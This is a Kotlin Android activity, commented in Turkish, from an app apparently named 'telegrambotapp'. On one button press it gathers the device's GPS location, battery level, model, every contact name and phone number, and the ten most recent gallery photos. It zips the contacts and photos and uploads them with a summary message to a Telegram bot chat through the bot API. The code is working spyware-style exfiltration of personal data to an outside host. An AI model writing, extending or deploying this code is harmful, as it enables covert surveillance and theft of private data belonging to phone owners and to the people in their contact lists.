package com.example.telegrambotapp

import android.Manifest
import android.annotation.SuppressLint
import android.content.ContentResolver
import android.content.pm.PackageManager
import android.database.Cursor
import android.location.Location
import android.location.LocationManager
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.ContactsContract
import android.provider.MediaStore
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import android.content.Intent
import android.content.IntentFilter
import android.net.Uri

class MainActivity : AppCompatActivity() {

    private val botToken = "BOT_TOKEN"
    private val chatId = "CHAT_ID"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val sendButton = findViewById<Button>(R.id.sendButton)
        sendButton.setOnClickListener {
            if (checkPermissions()) {
                collectAndSendData()
            } else {
                requestPermissions()
            }
        }
    }

    private fun checkPermissions(): Boolean {
        val permissions = arrayOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                Manifest.permission.READ_MEDIA_IMAGES
            } else {
                Manifest.permission.READ_EXTERNAL_STORAGE
            }
        )
        return permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun requestPermissions() {
        val permissions = arrayOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                Manifest.permission.READ_MEDIA_IMAGES
            } else {
                Manifest.permission.READ_EXTERNAL_STORAGE
            }
        )
        ActivityCompat.requestPermissions(this, permissions, 101)
    }

    private fun collectAndSendData() {
        GlobalScope.launch(Dispatchers.IO) {
            try {
                // Verileri topla
                val batteryLevel = getBatteryPercentage()
                val location = getLocation()
                val contacts = getContacts()
                val deviceInfo = getDeviceInfo()
                val recentPhotos = getRecentPhotos(10) // Test için 3 fotoğraf

                // Rehber numaraları ve isimleri, fotoğrafları zip dosyasına ekle
                val zipFile = File(cacheDir, "data.zip")
                zipData(zipFile, contacts, recentPhotos)

                // Telegram mesajı oluştur
                val message = """
                    📱 **Cihaz Bilgisi**
                    Model: ${deviceInfo["model"]}
                    Android: ${deviceInfo["androidVersion"]}
                    
                    🔋 **Batarya**: $batteryLevel%
                    
                    📍 **Konum**: ${location ?: "Alınamadı"}
                """.trimIndent()

                // Mesajı gönder
                sendTelegramMessage(message)

                // Zip dosyasını gönder
                sendTelegramFile(zipFile)

            } catch (e: Exception) {
                runOnUiThread {
                    Toast.makeText(this@MainActivity, "Hata: ${e.message}", Toast.LENGTH_LONG).show()
                }
            }
        }
    }

    // BATARYA SEVİYESİ ALMA
    private fun getBatteryPercentage(): Int {
        val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        return (level.toFloat() / scale.toFloat() * 100).toInt()
    }

    // KONUM ALMA
    @SuppressLint("MissingPermission")
    private fun getLocation(): String? {
        val locationManager = getSystemService(LOCATION_SERVICE) as LocationManager
        val location: Location? = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
        return location?.let { "Lat: ${it.latitude}, Lon: ${it.longitude}" }
    }

    // REHBER KİŞİLERİ VE NUMARALARI ALMA
    private fun getContacts(): List<String> {
        val contacts = mutableListOf<String>()
        val cursor: Cursor? = contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            null, null, null, null
        )
        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
                val contactId = it.getString(it.getColumnIndex(ContactsContract.Contacts._ID))
                val hasPhoneNumber = it.getString(it.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) == "1"
                if (hasPhoneNumber) {
                    val phonesCursor = contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        arrayOf(contactId),
                        null
                    )
                    phonesCursor?.use { phoneCursor ->
                        while (phoneCursor.moveToNext()) {
                            val phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                            contacts.add("$name: $phoneNumber")
                        }
                    }
                }
            }
        }
        return contacts
    }

    // CİHAZ BİLGİSİ
    @SuppressLint("HardwareIds")
    private fun getDeviceInfo(): Map<String, String> {
        return mapOf(
            "model" to "${Build.MANUFACTURER} ${Build.MODEL}",
            "androidVersion" to Build.VERSION.RELEASE
        )
    }

    // GALERİDEN FOTOĞRAFLAR
    private fun getRecentPhotos(limit: Int): List<File> {
        val photos = mutableListOf<File>()
        val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME)
        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"

        contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection, null, null, sortOrder
        )?.use { cursor ->
            var count = 0
            while (cursor.moveToNext() && count < limit) {
                val id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
                val name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
                val uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString())

                val file = File(cacheDir, name)
                contentResolver.openInputStream(uri)?.use { input ->
                    FileOutputStream(file).use { output ->
                        input.copyTo(output)
                    }
                }
                photos.add(file)
                count++
            }
        }
        return photos
    }

    // TELEGRAM MESAJ GÖNDERME
    private fun sendTelegramMessage(text: String) {
        try {
            val url = URL("https://api.telegram.org/bot$botToken/sendMessage")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")

            val postData = "chat_id=$chatId&text=${URLEncoder.encode(text, "UTF-8")}"
            DataOutputStream(conn.outputStream).use { it.writeBytes(postData) }

            if (conn.responseCode != 200) {
                println("Telegram error: ${conn.responseCode}")
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    // TELEGRAM ZIP DOSYASI GÖNDERME
    private fun sendTelegramFile(file: File) {
        try {
            val boundary = "Boundary-${System.currentTimeMillis()}"
            val url = URL("https://api.telegram.org/bot$botToken/sendDocument")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

            DataOutputStream(conn.outputStream).use { outputStream ->
                // Chat ID ekle
                outputStream.writeBytes("--$boundary\r\n")
                outputStream.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
                outputStream.writeBytes("$chatId\r\n")

                // Dosya verisi
                outputStream.writeBytes("--$boundary\r\n")
                outputStream.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"${file.name}\"\r\n")
                outputStream.writeBytes("Content-Type: application/zip\r\n\r\n")

                FileInputStream(file).use { input ->
                    input.copyTo(outputStream)
                }

                outputStream.writeBytes("\r\n--$boundary--\r\n")
            }

            if (conn.responseCode != 200) {
                println("Zip send failed: ${conn.responseCode}")
            }
        } catch (e: Exception) {
            e.printStackTrace()
        } finally {
            file.delete() // Geçici dosyayı sil
        }
    }

    // REHBERİ VE FOTOĞRAFLARI ZIP DOSYASINA EKLE
    private fun zipData(zipFile: File, contacts: List<String>, photos: List<File>) {
        try {
            ZipOutputStream(FileOutputStream(zipFile)).use { zip ->
                // Rehber numaraları
                zip.putNextEntry(ZipEntry("contacts.txt"))
                contacts.forEach { contact ->
                    zip.write("$contact\n".toByteArray())
                }
                zip.closeEntry()

                // Fotoğrafları zip'e ekle
                photos.forEach { photo ->
                    zip.putNextEntry(ZipEntry(photo.name))
                    FileInputStream(photo).use { input ->
                        input.copyTo(zip)
                    }
                    zip.closeEntry()
                }
            }
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }
}
